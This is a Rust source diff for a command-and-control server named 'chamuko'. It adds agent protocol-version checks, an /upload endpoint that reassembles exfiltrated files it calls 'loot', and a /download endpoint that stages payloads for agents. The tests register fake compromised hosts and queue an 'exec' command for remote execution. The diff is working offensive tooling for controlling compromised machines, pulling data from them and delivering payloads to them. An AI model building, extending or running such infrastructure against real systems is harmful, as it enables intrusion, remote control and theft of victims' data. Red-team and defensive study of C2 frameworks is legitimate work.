@@ -4,7 +4,8 @@ use std::sync::Arc;
 use tiny_http::{Header, Method, Request, Response, Server};
 
 use chamuko_protocol::{
-    BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest,
+    BeaconRequest, BeaconResponse, DownloadRequest, DownloadResponse, PROTOCOL_VERSION,
+    RegisterRequest, RegisterResponse, ResultsRequest, UploadRequest, UploadResponse,
 };
 
 use crate::state::State;
@@ -141,6 +142,8 @@ fn handle(
         (Method::Post, "/beacon") => handle_beacon(state, body),
         (Method::Post, "/results") => handle_results(state, body),
         (Method::Post, "/enqueue") => handle_enqueue(state, body),
+        (Method::Post, "/upload") => handle_upload(state, body),
+        (Method::Post, "/download") => handle_download(state, body),
         (Method::Get, "/agents") => handle_agents(state),
         (Method::Get, "/health") => (200, r#"{"status":"ok"}"#.to_string()),
         _ => (404, json_error("not found")),
@@ -155,12 +158,22 @@ fn handle_register(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, St
         Ok(r) => r,
         Err(e) => return (400, json_error(&e.to_string())),
     };
+    if req.protocol != PROTOCOL_VERSION {
+        return (
+            400,
+            json_error(&format!(
+                "protocol mismatch: agent speaks v{}, this C2 speaks v{PROTOCOL_VERSION}. \
+                 Rebuild the agent with the matching builder.",
+                req.protocol
+            )),
+        );
+    }
     let sleep = req.sleep.unwrap_or(DEFAULT_SLEEP);
     let jitter = req.jitter.unwrap_or(DEFAULT_JITTER);
     let id = state
         .lock()
         .unwrap()
-        .register_agent(req.agent, sleep, jitter);
+        .register_agent(req.agent, req.protocol, sleep, jitter);
     eprintln!("[c2] agent registered: {id} (sleep={sleep}s jitter={jitter}s)");
     let resp = RegisterResponse {
         id,
@@ -242,11 +255,67 @@ fn handle_agents(state: &Arc<std::sync::Mutex<State>>) -> (i32, String) {
             "sleep": entry.sleep,
             "jitter": entry.jitter,
             "last_seen": entry.last_seen,
-            "pending": entry.pending.len(),
-            "results": entry.results.len(),
+            "protocol": entry.protocol,
+            "pending": entry.pending_count(),
+            "tasks": entry.tasks.len(),
         }));
     }
     (200, json(&out))
+}
+
+fn handle_upload(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
+    let req: UploadRequest = match serde_json::from_str(body) {
+        Ok(r) => r,
+        Err(e) => return (400, json_error(&e.to_string())),
+    };
+    let mut guard = state.lock().unwrap();
+    match guard.accept_upload(&req.id, &req.name, req.chunk) {
+        Ok((received, total, Some(loot))) => {
+            eprintln!(
+                "[c2] loot complete: {} ({} bytes) sha256={}",
+                loot.name,
+                loot.size,
+                &loot.sha256[..16]
+            );
+            (
+                200,
+                json(&UploadResponse {
+                    received,
+                    total,
+                    complete: true,
+                    sha256: Some(loot.sha256),
+                }),
+            )
+        }
+        Ok((received, total, None)) => (
+            200,
+            json(&UploadResponse {
+                received,
+                total,
+                complete: false,
+                sha256: None,
+            }),
+        ),
+        Err(e) => (400, json_error(&e)),
+    }
+}
+
+fn handle_download(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
+    let req: DownloadRequest = match serde_json::from_str(body) {
+        Ok(r) => r,
+        Err(e) => return (400, json_error(&e.to_string())),
+    };
+    let guard = state.lock().unwrap();
+    match guard.serve_download(&req.transfer, req.index) {
+        Some((chunk, sha256)) => (
+            200,
+            json(&DownloadResponse {
+                chunk,
+                sha256: Some(sha256),
+            }),
+        ),
+        None => (404, json_error("unknown transfer or chunk index")),
+    }
 }
 
 fn json<T: serde::Serialize>(value: &T) -> String {
@@ -273,8 +342,8 @@ mod tests {
     #[test]
     fn register_echoes_requested_interval() {
         let state = state();
-        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1},"sleep":11,"jitter":4}"#;
-        let (status, response) = handle(&state, &Method::Post, "/register", body);
+        let body = format!(r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"sleep":11,"jitter":4,"protocol":{PROTOCOL_VERSION}}}"#);
+        let (status, response) = handle(&state, &Method::Post, "/register", &body);
         assert_eq!(status, 200);
         let parsed: RegisterResponse = serde_json::from_str(&response).unwrap();
         assert_eq!((parsed.sleep, parsed.jitter), (11, 4));
@@ -282,8 +351,8 @@ mod tests {
 
     #[test]
     fn register_defaults_when_interval_missing() {
-        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}}"#;
-        let (status, response) = post("/register", body);
+        let body = format!(r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"protocol":{PROTOCOL_VERSION}}}"#);
+        let (status, response) = post("/register", &body);
         assert_eq!(status, 200);
         let parsed: RegisterResponse = serde_json::from_str(&response).unwrap();
         assert_eq!((parsed.sleep, parsed.jitter), (DEFAULT_SLEEP, DEFAULT_JITTER));
@@ -299,8 +368,8 @@ mod tests {
     #[test]
     fn beacon_reports_configured_interval() {
         let state = state();
-        let register = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1},"sleep":9,"jitter":1}"#;
-        let (_, response) = handle(&state, &Method::Post, "/register", register);
+        let register = format!(r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"sleep":9,"jitter":1,"protocol":{PROTOCOL_VERSION}}}"#);
+        let (_, response) = handle(&state, &Method::Post, "/register", &register);
         let id: RegisterResponse = serde_json::from_str(&response).unwrap();
         let (status, response) = handle(
             &state,
@@ -350,13 +419,109 @@ mod tests {
             &state,
             &Method::Post,
             "/register",
-            r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}}"#,
+            &format!(r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"protocol":{PROTOCOL_VERSION}}}"#),
         );
         let id: RegisterResponse = serde_json::from_str(&response).unwrap();
         let body = format!(r#"{{"id":"{}","command":"exec","args":["id"]}}"#, id.id);
         assert_eq!(handle(&state, &Method::Post, "/enqueue", &body).0, 200);
         let ghost = r#"{"id":"ghost","command":"exec"}"#;
         assert_eq!(handle(&state, &Method::Post, "/enqueue", ghost).0, 404);
+    }
+
+
+    #[test]
+    fn register_rejects_protocol_mismatch() {
+        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1},"protocol":1}"#;
+        let (status, response) = post("/register", body);
+        assert_eq!(status, 400);
+        assert!(response.contains("protocol mismatch"));
+    }
+
+    #[test]
+    fn register_accepts_current_protocol() {
+        let body = format!(
+            r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"protocol":{PROTOCOL_VERSION}}}"#
+        );
+        assert_eq!(post("/register", &body).0, 200);
+    }
+
+    #[test]
+    fn upload_reassembles_a_file_across_chunks() {
+        let dir = std::env::temp_dir().join(format!("chamuko-srv-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let state = Arc::new(Mutex::new(State::with_loot_dir(&dir)));
+
+        let (_, response) = handle(
+            &state,
+            &Method::Post,
+            "/register",
+            &format!(
+                r#"{{"agent":{{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}},"protocol":{PROTOCOL_VERSION}}}"#
+            ),
+        );
+        let id: RegisterResponse = serde_json::from_str(&response).unwrap();
+
+        let payload: Vec<u8> = (0..150_000u32).map(|i| (i % 253) as u8).collect();
+        let chunks = chamuko_protocol::chunk_bytes("up-1", &payload);
+        let total = chunks.len();
+        assert!(total > 1, "test needs a multi-chunk payload");
+
+        for (n, chunk) in chunks.into_iter().enumerate() {
+            let body = serde_json::json!({
+                "id": id.id,
+                "name": "dump.bin",
+                "chunk": chunk,
+            })
+            .to_string();
+            let (status, response) = handle(&state, &Method::Post, "/upload", &body);
+            assert_eq!(status, 200, "chunk {n}: {response}");
+            let parsed: UploadResponse = serde_json::from_str(&response).unwrap();
+            assert_eq!(parsed.total, total as u32);
+            assert_eq!(parsed.complete, n + 1 == total);
+        }
+
+        let guard = state.lock().unwrap();
+        let loot = guard.loot();
+        assert_eq!(loot.len(), 1);
+        assert_eq!(loot[0].size, payload.len());
+        assert_eq!(std::fs::read(&loot[0].path).unwrap(), payload);
+        drop(guard);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn upload_rejects_unknown_agent() {
+        let chunk = chamuko_protocol::Chunk::new("t", 0, 1, b"x");
+        let body = serde_json::json!({"id":"ghost","name":"a","chunk":chunk}).to_string();
+        assert_eq!(post("/upload", &body).0, 400);
+    }
+
+    #[test]
+    fn download_serves_staged_chunks() {
+        let state = state();
+        let data = vec![4u8; 100];
+        let transfer = state.lock().unwrap().stage_download("payload.bin", data.clone());
+
+        let body = serde_json::json!({"transfer": transfer, "index": 0}).to_string();
+        let (status, response) = handle(&state, &Method::Post, "/download", &body);
+        assert_eq!(status, 200);
+        let parsed: DownloadResponse = serde_json::from_str(&response).unwrap();
+        assert_eq!(parsed.chunk.bytes().unwrap(), data);
+        assert_eq!(parsed.sha256.unwrap(), chamuko_protocol::sha256_hex(&data));
+    }
+
+    #[test]
+    fn download_rejects_out_of_range_index() {
+        let state = state();
+        let transfer = state.lock().unwrap().stage_download("a", vec![1, 2, 3]);
+        let body = serde_json::json!({"transfer": transfer, "index": 99}).to_string();
+        assert_eq!(handle(&state, &Method::Post, "/download", &body).0, 404);
+    }
+
+    #[test]
+    fn download_rejects_unknown_transfer() {
+        let body = r#"{"transfer":"nope","index":0}"#;
+        assert_eq!(post("/download", body).0, 404);
     }
 
     #[test]
